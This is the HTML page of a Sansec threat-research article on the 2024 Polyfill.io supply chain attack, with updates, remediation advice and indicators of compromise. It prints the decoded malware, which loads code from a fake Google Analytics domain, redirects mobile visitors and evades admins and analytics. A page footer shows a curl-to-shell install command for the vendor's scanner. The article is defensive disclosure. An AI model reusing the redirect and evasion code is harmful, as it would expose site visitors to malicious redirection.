<!doctype html><html lang="en" class="scroll-pt-20 scroll-smooth"><head><meta charset="UTF-8"><meta name="description" content="The new Chinese owner of the popular Polyfill JS project injects malware into more than 100 thousand sites."><meta name="generator" content="Eleventy v2.0.1"><meta property="og:url" content="https://sansec.io/research/polyfill-supply-chain-attack"><meta property="og:type" content="website"><meta property="og:title" content="Polyfill supply chain attack hits 100K+ sites"><meta property="og:site_name" content="Sansec"><meta property="og:description" content="The new Chinese owner of the popular Polyfill JS project injects malware into more than 100 thousand sites."><meta property="og:image" content="https://sansec.io/assets/2023/og/720/og-graphic-3.webp"><meta property="og:image:width" content="720"><meta property="og:image:height" content="300"><meta property="twitter:site" content="@sansecio"><meta property="twitter:card" content="summary_large_image"><meta name="ahrefs-site-verification" content="a57b51e4071e265c21eb609be1508e1000b564d78182e5a9a42a836388453b7d"><script type="application/ld+json">{
	  "@context": "https://schema.org",
	  "@type": "WebSite",
	  "name": "Sansec",
	  "alternateName": "Sansec",
	  "url": "https://sansec.io"
	}</script><script type="application/ld+json">{
	  "@context": "https://schema.org",
	  "@type": "Organization",
	  "name": "Sansec",
	  "url": "https://sansec.io",
	  "logo": "https://sansec.io/assets/images/sansec-social.png",
	  "alternateName": "Sansec",
	  "sameAs": [
	    "https://twitter.com/sansecio",
	    "https://sansec.io",
		"https://www.linkedin.com/company/sansec/",
		"https://github.com/sansecio"
	  ],
	  "description": "The new Chinese owner of the popular Polyfill JS project injects malware into more than 100 thousand sites."
	}</script><meta name="viewport" content="width=device-width"><link rel="icon" href="/assets/images/favicon.ico" type="image/x-icon"><title>Polyfill supply chain attack hits 100K+ sites</title><link rel="canonical" href="https://sansec.io/research/polyfill-supply-chain-attack"><link type="text/plain" rel="author" href="/humans.txt"><link rel="alternate" type="application/atom+xml" title="" href="/atom.xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="/assets/2023/tailwind.css?1719273600"><script defer="defer" src="/assets/2023/alpine.js"></script><script type="module">//	copy handler for curl ecomscan
        document.addEventListener("DOMContentLoaded", function () {
            document.querySelectorAll(".copyButton").forEach(function (t) {
                t.addEventListener("click", (ev) => {
                    const u = t.getAttribute("data-content");
                    console.log("adding copy handler for", u);
                    navigator.clipboard.writeText(u).then(() => {
                        t.src = "/assets/2023/check.svg";
                        t.classList.remove("animate-pulse");
                        setTimeout(() => {
                            t.src = "/assets/2023/copyfile.svg";
                            t.classList.add("animate-pulse");
                        }, 1000);
                    });

                })
            })
        });
        // menu dropdown
        const c = document.getElementById("dropdown-button"),
            m = document.getElementById("dropdown-button-mob"),
            s = document.getElementById("dropdown-content"),
            d = document.getElementById("dropdown-content-mob"),
            i = document.getElementById("mainmenu-mob"),
            l = document.getElementById("hamburger"),
            a = document.getElementById("mobilemenu"),
            r = document.getElementById("crossMenu"),
            n = document.getElementById("backMenu");
        l.addEventListener("click", function () { a.classList.remove("hidden") });
        r.addEventListener("click", function () { a.classList.add("hidden"), d.classList.add("hidden"), n.classList.add("hidden") });
        n.addEventListener("click", function () { d.classList.add("hidden"), crossMenu.classList.remove("hidden"), n.classList.add("hidden"), i.classList.remove("hidden") });
        c.addEventListener("mouseover", function () { s.classList.remove("hidden") });
        m.addEventListener("click", function () { d.classList.remove("hidden"), n.classList.remove("hidden"), crossMenu.classList.add("hidden"), i.classList.add("hidden") });
        c.addEventListener("mouseleave", function () { s.classList.add("hidden") });</script><script type="text/javascript">window._mfq=window._mfq||[],function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//cdn.mouseflow.com/projects/b8b33745-29ba-4a8d-8a21-4019ba29e934.js",document.getElementsByTagName("head")[0].appendChild(e)}()</script></head><body x-data="{
        ssScrolled: false,
        checkScroll() {
            if (window.pageYOffset > 112) {
                this.ssScrolled = true;
            } else if (window.pageYOffset <= 112) {
                this.ssScrolled = false;
            }
        }
    }" x-init="checkScroll()" @scroll.window="checkScroll()" class="bg-white overscroll-none"><div class="hidden md:block duration-100 bg-white fixed h-28 justify-between shadow-xl top-0 transition-all w-full z-40" :class="{'h-28': !ssScrolled, 'h-16': ssScrolled}"><a href="/guides/usage" class="hidden text-white absolute bg-ss-teal font-poppins font-semibold h-full hover:bg-ss-teal-hover items-center justify-center lg:flex right-0 w-64 z-50"><div class="hidden" :class="{'hidden': !ssScrolled, 'block': ssScrolled}">Scan your store now</div><div class="border-b-2 border-white pb-1" :class="{'block': !ssScrolled, 'hidden': ssScrolled}">Scan your<br>store now</div></a><div class="flex items-center w-full font-poppins font-semibold container flex-row h-full lg:text-base mx-auto relative text-sm"><div class="flex duration-100 flex-initial lg:mr-8 md:mr-4 origin-left transform transition w-[200px]" :class="{'scale-100': !ssScrolled, 'scale-75': ssScrolled}"><a href="/" aria-label="Back to home"><img src="/assets/2023/sansec-black.svg" width="186" height="35" alt="Sansec"></a></div><nav id="nav"><ul class="flex" :class="{'mt-0': ssScrolled, 'mt-2': !ssScrolled}"><li class="cursor-pointer hover:text-ss-teal mr-12"><a href="/#ecomscan">Product</a></li><li class="cursor-pointer hover:text-ss-teal mr-12"><a href="/pricing">Pricing</a></li><li id="dropdown-button" class="cursor-pointer mr-8"><span class="hover:text-ss-teal">Resources</span><svg class="inline-block -rotate-90 ml-2" id="a" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" width="10.666" height="14" viewBox="0 0 10.666 18.504"><path d="m9.959.707L1.414,9.252l8.545,8.545" fill="none" stroke="#1d2227" stroke-width="2"></path></svg><div id="dropdown-content" class="hidden absolute duration-100 transition-all w-48" :class="{'pt-11': !ssScrolled, 'pt-6': ssScrolled}"><div class="bg-white -mt-2 border-ss-teal border-t-4"><ul class="flex flex-col gap-y-8 p-8 shadow-2xl"><a href="/research"><li class="cursor-pointer hover:text-ss-teal">Research</li></a><a href="/partners"><li class="cursor-pointer hover:text-ss-teal">Partners</li></a><a href="/guides"><li class="cursor-pointer hover:text-ss-teal">Guides</li></a><a href="/malware"><li class="cursor-pointer hover:text-ss-teal">Malware</li></a></ul></div></div></li><li class="cursor-pointer hover:text-ss-teal mr-12"><a href="/company">Company</a></li><li class="cursor-pointer hover:text-ss-teal"><a href="/contact">Contact</a></li></ul></nav></div></div><div class="flex items-center w-full bg-white top-0 z-50 fixed h-20 justify-between md:hidden pl-4 pr-4 shadow-xl"><div class="flex mr-16 w-40"><a href="/"><img alt="Sansec logo" src="/assets/2023/sansec-black.svg" width="186" height="35"></a></div><div id="hamburger" class="cursor-pointer flex h-6 w-6"><svg class="" viewBox="0 0 24 18" xmlns="http://www.w3.org/2000/svg"><g stroke="#1d2227" stroke-width="2"><path d="m0 1h24"></path><path d="m0 9h24"></path><path d="m0 17h24"></path></g></svg></div></div><div id="mobilemenu" class="flex items-center w-full bg-white top-0 z-50 fixed bottom-0 flex-col font-poppins font-semibold hidden justify-center text-2xl text-center"><div class="flex items-center w-full bg-white top-0 z-50 h-20 justify-between md:hidden pl-4 pr-4 absolute"><div class="flex mr-16 w-[160px]"><img alt="Sansec logo" src="/assets/2023/sansec-black.svg" width="186" height="35"></div><div id="cross" class="cursor-pointer flex"><svg id="crossMenu" class="w-6 h-6" xmlns="http://www.w3.org/2000/svg" height="18.385" viewBox="0 0 18.385 18.385" width="18.385"><g fill="none" stroke="#1d2227" stroke-width="2"><path d="m286.771 118.832h24" transform="matrix(.70710678 .70710678 -.70710678 .70710678 -118.043 -286.098)"></path><path d="m286.771 118.832h24" transform="matrix(.70710678 -.70710678 .70710678 .70710678 -286.097 136.428)"></path></g></svg><svg id="backMenu" class="hidden -rotate-270 inline-block ml-4" id="a" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" width="14" height="20" viewBox="0 0 10.666 18.504"><path d="m9.959.707L1.414,9.252l8.545,8.545" fill="none" stroke="#1d2227" stroke-width="2"></path></svg></div></div><nav id="nav"><ul id="mainmenu-mob" class="flex flex-col"><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/#ecomscan">Product</a></li><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/pricing">Pricing</a></li><li id="dropdown-button-mob" class="cursor-pointer mb-4"><span class="hover:text-ss-teal">Resources</span><svg class="inline-block -rotate-90 ml-4" id="a" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" width="10.666" height="14" viewBox="0 0 10.666 18.504"><path d="m9.959.707L1.414,9.252l8.545,8.545" fill="none" stroke="#1d2227" stroke-width="2"></path></svg></li><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/company">Company</a></li><li class="cursor-pointer hover:text-ss-teal"><a href="/contact">Contact</a></li></ul><ul id="dropdown-content-mob" class="flex flex-col hidden"><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/research">Research</a></li><li class="cursor-pointer mb-4 hover:text-ss-teal"><a href="/partners">Partners</a></li><li class="cursor-pointer hover:text-ss-teal"><a href="/guides">Support</a></li></ul></nav><div class="cursor-pointer flex absolute bg-ss-red bottom-0 flex-none font-bold font-poppins hover:bg-ss-teal items-center justify-center lg:text-base pb-8 pl-8 pr-8 pt-8 text-sm text-white transition-all w-full"><a href="/guides/usage" class="block border-b-2 border-white group-hover:hidden pb-1">Scan your store now!</a></div></div><main class="md:mt-28 mt-20"><div class="bg-ss-grey"><div class="container mx-auto pt-16"><div class="max-w-2xl pb-36"><h1 class="font-bold text-ss-purple leading-tight mb-5 text-4xl">Polyfill supply chain attack hits 100K+ sites</h1><div class="flex items-center mb-8"><img src="/assets/images/sansec-social.svg" alt="Sansec" class="inline-block h-10 mr-3 w-10" width="610" height="458"><div class="leading-relaxed text-gray-600 font-medium text-sm tracking-tight"><p>by Sansec Forensics Team</p><p class="text-xs">Published in <a href="/research" class="underline">Threat Research</a> &minus; June 25, 2024</p></div></div><div class="leading-relaxed text-gray-600 [&_a]:text-ss-teal hover:[&_a]:text-ss-teal-hover text-xl"><p>The new Chinese owner of the popular Polyfill JS project injects malware into more than 100 thousand sites.</p></div></div></div></div><section class="bg-white mb-12 my-4"><div class="flex gap-x-6 container mx-auto"><div class="max-w-2xl lg:mx-0 w-full"><div class="-mt-32 -mx-6 italic mb-6 text-center text-gray-400 text-sm"><img class="bg-white border border-gray-300" src="/assets/2023/og/720/og-graphic-3.webp" alt="Polyfill supply chain attack hits 100K+ sites"></div><div class="markdown pt-4"><div class="p-4 border-2 border-ss-teal my-4"><strong>Update June 28th</strong>: We are flagging more domains that have been used by the same actor to spread malware since at least <a href="https://x.com/nullifysecurity/status/1806489013567778923">June 2023</a>: <code>bootcdn.net</code>, <code>bootcss.com</code>, <code>staticfile.net</code>, <code>staticfile.org</code>, <code>unionadjs.com</code>, <code>xhsbpza.com</code>, <code>union.macoms.la</code>, <code>newcrbpc.com</code>.</div><div class="p-4 border-2 border-ss-teal my-4"><strong>Update June 27th</strong>: Cloudflare has implemented real-time rewrites of cdn.polyfill.io to their own version. A little later, Namecheap has put the domain on hold altogether, which eliminates the risk for now. However, you are still recommended to remove any polyfill.io references in your code.</div><div class="p-4 border-2 border-ss-teal my-4"><strong>Update June 26th</strong>: Someone launched similar DDoS attacks against our infrastructure and BleepingComputer (who was the first to cover our research).</div><div class="p-4 border-2 border-ss-teal my-4"><strong>Update June 25th</strong>: Google has already started blocking Google Ads for eCommerce sites that use polyfill.io.</div><p>The <code>polyfill.js</code> is a popular open source library to support older browsers. <a href="https://publicwww.com/websites/%22cdn.polyfill.io%22/">100K+ sites</a> embed it using the <code>cdn.polyfill.io</code> domain. Notable users are JSTOR, Intuit and World Economic Forum. However, in February this year, a Chinese company bought the domain and the Github account. Since then, this domain was caught injecting <a href="https://web.archive.org/web/20240624110153/https://github.com/polyfillpolyfill/polyfill-service/issues/2873">malware</a> on mobile devices via any site that embeds <code>cdn.polyfill.io</code>. Any complaints were quickly removed (<a href="https://web.archive.org/web/20240229113710/https://github.com/polyfillpolyfill/polyfill-service/issues/2834">archive here</a>) from the Github repository.</p><p>The polyfill code is dynamically generated based on the HTTP headers, so multiple attack vectors are likely. Sansec decoded one particular malware (see below) which redirects mobile users to a <a href="https://w9.vty70.net/">sports betting site</a> using a fake Google analytics domain (<code>www.googie-anaiytics.com</code>). The code has specific protection against reverse engineering, and only activates on specific mobile devices at specific hours. It also does not activate when it detects an admin user. It also delays execution when a web analytics service is found, presumably to not end up in the stats.</p><p>The original <a href="https://x.com/triblondon/status/1761852117579427975">polyfill author</a> recommends to not use Polyfill at all, as it is no longer needed by modern browsers anyway. Meanwhile, both <a href="https://community.fastly.com/t/new-options-for-polyfill-io-users/2540">Fastly</a> and <a href="https://cdnjs.cloudflare.com/polyfill">Cloudflare</a> have put up trustworthy alternatives, if you still need it.</p><p>This incident is a typical example of a supply chain attack. To get visibility into the code that your users are loading, we recommend our (free) CSP monitoring service <a href="/watch">Sansec Watch</a>.</p><p>Our <a href="/#ecomscan">eComscan backend scanner</a> has also been updated with <a href="https://polyfill.io">polyfill.io</a> detection.</p><h2 id="polyfill-malicious-payload-example" tabindex="-1">Polyfill malicious payload example</h2><p>We added some names for readability, however <code>tiaozhuan</code> came from the original malware (which means &quot;jump&quot; in Chinese).</p><pre><code class="hljs"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isPc</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">var</span> _isWin =
        navigator.<span class="hljs-property">platform</span> == <span class="hljs-string">&quot;Win32&quot;</span> || navigator.<span class="hljs-property">platform</span> == <span class="hljs-string">&quot;Windows&quot;</span>,
      _isMac =
        navigator.<span class="hljs-property">platform</span> == <span class="hljs-string">&quot;Mac68K&quot;</span> ||
        navigator.<span class="hljs-property">platform</span> == <span class="hljs-string">&quot;MacPPC&quot;</span> ||
        navigator.<span class="hljs-property">platform</span> == <span class="hljs-string">&quot;Macintosh&quot;</span> ||
        navigator.<span class="hljs-property">platform</span> == <span class="hljs-string">&quot;MacIntel&quot;</span>;
    <span class="hljs-keyword">if</span> (_isMac || _isWin) {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
  } <span class="hljs-keyword">catch</span> (_0x44e1f6) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">vfed_update</span>(<span class="hljs-params">_0x5ae1f8</span>) {
  _0x5ae1f8 !== <span class="hljs-string">&quot;&quot;</span> &amp;&amp;
    <span class="hljs-title function_">loadJS</span>(
      <span class="hljs-string">&quot;https://www.googie-anaiytics.com/html/checkcachehw.js&quot;</span>,
      <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) {
        <span class="hljs-keyword">if</span> (usercache == <span class="hljs-literal">true</span>) {
          <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = _0x5ae1f8;
        }
      }
    );
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">check_tiaozhuan</span>(<span class="hljs-params"></span>) {
  <span class="hljs-keyword">var</span> _isMobile = navigator.<span class="hljs-property">userAgent</span>.<span class="hljs-title function_">match</span>(
    <span class="hljs-regexp">/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i</span>
  );
  <span class="hljs-keyword">if</span> (_isMobile) {
    <span class="hljs-keyword">var</span> _curHost = <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">host</span>,
      _ref = <span class="hljs-variable language_">document</span>.<span class="hljs-property">referrer</span>,
      _redirectURL = <span class="hljs-string">&quot;&quot;</span>,
      _kuurzaBitGet = <span class="hljs-string">&quot;https://kuurza.com/redirect?from=bitget&quot;</span>,
      _rnd = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">100</span> + <span class="hljs-number">1</span>),
      _date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(),
      _hours = _date.<span class="hljs-title function_">getHours</span>();
    <span class="hljs-keyword">if</span> (
      _curHost.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;www.dxtv1.com&quot;</span>) !== -<span class="hljs-number">1</span> ||
      _curHost.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;www.ys752.com&quot;</span>) !== -<span class="hljs-number">1</span>
    ) {
      _redirectURL = <span class="hljs-string">&quot;https://kuurza.com/redirect?from=bitget&quot;</span>;
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">if</span> (_curHost.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;shuanshu.com.com&quot;</span>) !== -<span class="hljs-number">1</span>) {
        _redirectURL = <span class="hljs-string">&quot;https://kuurza.com/redirect?from=bitget&quot;</span>;
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">if</span> (_ref.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.&quot;</span>) !== -<span class="hljs-number">1</span> &amp;&amp; _ref.<span class="hljs-title function_">indexOf</span>(_curHost) == -<span class="hljs-number">1</span>) {
          _redirectURL = <span class="hljs-string">&quot;https://kuurza.com/redirect?from=bitget&quot;</span>;
        } <span class="hljs-keyword">else</span> {
          <span class="hljs-keyword">if</span> (_hours &gt;= <span class="hljs-number">0</span> &amp;&amp; _hours &lt; <span class="hljs-number">2</span>) {
            <span class="hljs-keyword">if</span> (_rnd &lt;= <span class="hljs-number">10</span>) {
              _redirectURL = _kuurzaBitGet;
            }
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (_hours &gt;= <span class="hljs-number">2</span> &amp;&amp; _hours &lt; <span class="hljs-number">4</span>) {
              _rnd &lt;= <span class="hljs-number">15</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
            } <span class="hljs-keyword">else</span> {
              <span class="hljs-keyword">if</span> (_hours &gt;= <span class="hljs-number">4</span> &amp;&amp; _hours &lt; <span class="hljs-number">7</span>) {
                _rnd &lt;= <span class="hljs-number">20</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
              } <span class="hljs-keyword">else</span> {
                _hours &gt;= <span class="hljs-number">7</span> &amp;&amp; _hours &lt; <span class="hljs-number">8</span>
                  ? _rnd &lt;= <span class="hljs-number">10</span> &amp;&amp; (_redirectURL = _kuurzaBitGet)
                  : _rnd &lt;= <span class="hljs-number">10</span> &amp;&amp; (_redirectURL = _kuurzaBitGet);
              }
            }
          }
        }
      }
    }
    _redirectURL != <span class="hljs-string">&quot;&quot;</span> &amp;&amp;
      !<span class="hljs-title function_">isPc</span>() &amp;&amp;
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;admin_id&quot;</span>) == -<span class="hljs-number">1</span> &amp;&amp;
      <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;adminlevels&quot;</span>) == -<span class="hljs-number">1</span> &amp;&amp;
      <span class="hljs-title function_">vfed_update</span>(_redirectURL);
  }
}
<span class="hljs-keyword">let</span> _outerPage = <span class="hljs-variable language_">document</span>.<span class="hljs-property">documentElement</span>.<span class="hljs-property">outerHTML</span>,
  bdtjfg = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;hm.baidu.com&quot;</span>) != -<span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> cnzfg = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.cnzz.com&quot;</span>) != -<span class="hljs-number">1</span>,
  wolafg = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.51.la&quot;</span>) != -<span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> mattoo = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.matomo.org&quot;</span>) != -<span class="hljs-number">1</span>,
  aanaly = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.google-analytics.com&quot;</span>) != -<span class="hljs-number">1</span>;
<span class="hljs-keyword">let</span> ggmana = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.googletagmanager.com&quot;</span>) != -<span class="hljs-number">1</span>,
  aplausix = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.plausible.io&quot;</span>) != -<span class="hljs-number">1</span>,
  statcct = _outerPage.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.statcounter.com&quot;</span>) != -<span class="hljs-number">1</span>;
bdtjfg || cnzfg || wolafg || mattoo || aanaly || ggmana || aplausix || statcct
  ? <span class="hljs-built_in">setTimeout</span>(check_tiaozhuan, <span class="hljs-number">2000</span>)
  : <span class="hljs-title function_">check_tiaozhuan</span>();
</code></pre><h2 id="indicators-of-compromise" tabindex="-1">Indicators of compromise</h2><pre><code class="hljs">https://kuurza.com/redirect?from=bitget
https://www.googie-anaiytics.com/html/checkcachehw.js
https://www.googie-anaiytics.com/ga.js
https://cdn.bootcss.com/highlight.js/9.7.0/highlight.min.js
https://union.macoms.la/jquery.min-4.0.2.js
https://newcrbpc.com/redirect?from=bscbc

bootcdn.net
staticfile.net
staticfile.org
unionadjs.com
xhsbpza.com
</code></pre><h2>Read more</h2><ul><li><a href="/research/google-services-abused-skimming-campaigns">Google services abused in skimming campaigns</a></li><li><a href="/research/cosmicsting-fallout">Thousands of Adobe Commerce stores hacked in competing CosmicSting campaigns</a></li><li><a href="/research/cosmicsting">CosmicSting attack & defense overview</a></li><li><a href="/research/cosmicsting-cnext-persistent-backdoor">Persistent backdoors injected on Adobe Commerce via new CosmicSting attack</a></li><li><a href="/research/cosmicsting-hitting-major-stores">CosmicSting attacks have started hitting major stores</a></li></ul></div></div><div class="hidden lg:block lg:flex-1 overflow-clip pt-4"><div data-aos="fade-left" class="flex flex-col gap-y-8 [&>div]:border-ss-grey [&>div]:border-t-2 [&>div]:p-4 [&>div]:shadow-md max-w-[350px] my-0 overflow-clip pb-4 px-8 sticky text-sm top-24"><div class=""><h5 class="font-bold text-ss-purple mb-3 overflow-clip overflow-ellipsis">In this article</h5><nav class="toc"><ol><li><a href="#polyfill-malicious-payload-example">Polyfill malicious payload example</a></li><li><a href="#indicators-of-compromise">Indicators of compromise</a></li></ol></nav></div><div class="overflow-hidden relative"><img src="/assets/2023/malware.svg" class="-right-12 -top-12 absolute h-40 opacity-5"><h5 class="font-bold text-ss-purple mb-3">Easy CSP for your store?</h5><p class="leading-relaxed text-gray-700">Try Sansec Watch! Free, simple and fully integrated. Get PCI compliant alerting with minimal effort.</p><a class="block font-semibold bg-ss-teal hover:bg-ss-teal-hover mb-1 mt-3 py-1 rounded text-center text-white whitespace-nowrap" href="/watch">Sansec Watch</a></div></div></div></div></section><div class="text-white bg-ss-purple container mx-auto p-0 sm:rounded-t-md"><div class="grid md:grid-cols-12 overflow-hidden"><div class="lg:p-16 md:col-span-7 px-4 py-8 sm:p-10"><h2 class="leading-tight font-semibold text-3xl tracking-wide">Scan your store <span class="text-ss-yellow">now</span><br>for malware &amp; vulnerabilities</h2><div class="flex items-center w-full justify-between bg-ss-deep-purple font-roboto-mono my-10 p-4 rounded-lg text-lg tracking-wider">$ curl ecomscan.com | sh<div class="flex h-full relative"><img class="cursor-pointer h-6 w-6 animate-pulse bg-ss-dark copyButton duration-100 ease-in-out hidden hover:animate-none hover:scale-105 md:block" data-content="curl https://ecomscan.com | sh" alt="copy code" src="/assets/2023/copyfile.svg" width="40" height="50"></div></div><p><a href="/#ecomscan" class="text-ss-yellow sm:no-underline underline">eComscan</a> is the most thorough security scanner for Magento, Adobe Commerce, Shopware, WooCommerce and many more.</p><a href="/#ecomscan" class="hidden font-bold bg-ss-yellow hover:bg-white max-w-fit mt-10 p-3 rounded sm:block text-sm text-ss-purple tracking-wider uppercase">Learn more</a></div><div class="hidden items-end h-full md:col-span-5 relative sm:flex"><div class="w-[900px] -bottom-16 absolute bg-ss-dark h-full rounded-xl"><div class="p-4 pl-6"><img class="w-[100px]" alt="Terminal window" src="/assets/2023/trafficlight.svg" width="118" height="26"></div><img class="w-[900px]" alt="eComscan demo" src="/assets/2023/ecomdemo.webp" width="1200" height="700"></div></div></div></div></main><div class="overflow-clip bg-black relative z-30"><div class="hidden md:block absolute bg-ss-yellow h-52 right-0 rounded-full translate-x-40 translate-y-20 w-52"></div><div class="container mx-auto pt-16 gap-8 grid md:grid-cols-9"><div class="hidden md:block col-span-2 text-white space-y-10"><h3 class="font-bold text-lg">Made with <span class="text-ss-teal">â¤</span></h3><div class="font-inter text-sm">Sansec BV<br>Wolvenplein 25<br>3512 CK Utrecht<br>The Netherlands<br><a class="text-ss-teal hover:underline" href="/cdn-cgi/l/email-protection#eb82858d84ab988a85988e88c58284"><span class="__cf_email__" data-cfemail="cca5a2aaa38cbfada2bfa9afe2a5a3">[email&#160;protected]</span></a></div><img src="/assets/images/pango-icon-100.webp" width="100" height="100" alt="Sansec mascotte Pango" class="ml-2 h-24 mt-4"></div><div class="hidden md:block col-span-2 text-white"><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/ecomscan">Product</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/pricing">Pricing</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/guides">Guides</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/partners">Partners</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/what-is-magecart">About Magecart</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/malware">Malware library</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/media-coverage">Media coverage</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="https://status.sansec.io">System status</a></div><div class="hidden md:block col-span-2 text-white"><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/research">Research</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/company">Company</a><a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/contact">Contact</a> <a class="cursor-pointer mb-4 block font-semibold hover:underline" href="/account">Login</a></div><div class="text-white text-center col-span-3 md:text-left z-40"><h2 class="font-bold text-2xl">Stay up to date with the latest eCommerce attacks</h2><newsletter data-classes="newsletter_footer"></newsletter></div></div><div class="flex items-center container mx-auto flex-col md:flex-row md:items-end pb-8 border-opacity-50 border-ss-grey md:justify-between mt-24 relative"><div><img class="mb-8 md:mb-0" alt="Sansec logo" src="/assets/2023/sansec-white.svg" width="215" height="40"></div><div><h2 class="text-white text-center font-bold text-3xl">experts in eCommerce security</h2></div></div><div class="flex items-center justify-between container flex-col md:flex-row md:items-end mx-auto pb-8"><div class="flex text-white h-fit items-end justify-between mb-8 md:mb-0 min-w-[215px]"><a href="https://bsky.app/profile/sans.ec" aria-label="Our Bluesky account (@sans.ec)" class="block"><img class="translate-y-0.5 h-6" alt="Bluesky" src="/assets/2023/bluesky.svg"> </a><a href="https://t.me/+UIHBVcHK4OYxYjlk" aria-label="Our Telegram account" class="block"><img class="h-8 translate-y-1" alt="Telegram" src="/assets/2023/telegram.svg"> </a><a href="https://www.linkedin.com/company/sansec/" aria-label="Linkedin" class="block"><img class="h-7" src="/assets/2023/linkedin.svg" alt="Linkedin"> </a><a href="/cdn-cgi/l/email-protection#6a03040c052a190b04190f09440305" aria-label="Send us a mail" class="block"><img class="h-5" src="/assets/2023/mail.svg" alt="Email"> </a><a href="/atom.xml" aria-label="Subscribe to our RSS feed" class="block"><img class="h-5" src="/assets/images/rss.svg" alt="RSS"></a></div><div class="flex text-white gap-x-2 md:text-sm text-right text-xs"><a class="block hover:underline" href="/downloads/sansec_tc.pdf">Terms & Conditions</a><div>&bull;</div><a class="block hover:underline" href="/downloads/sansec_pcp.pdf">Privacy & Cookie Policy</a><div class="hidden lg:block">&bull;</div><div class="hidden lg:block">Company Reg 77165187</div><div class="hidden lg:block">&bull;</div><div class="hidden lg:block">Tax NL860920306B01</div></div></div></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="/assets/2023/newsletter.js" type="text/javascript" charset="utf-8"></script><script async>(new Image).src="https://api.sansec.io/v1/ping"</script><script async defer="defer" src="/assets/2023/simple.js"></script><noscript><img src="https://simple.sansec.io/noscript.gif" alt="spacer" referrerpolicy="no-referrer-when-downgrade"></noscript></body></html>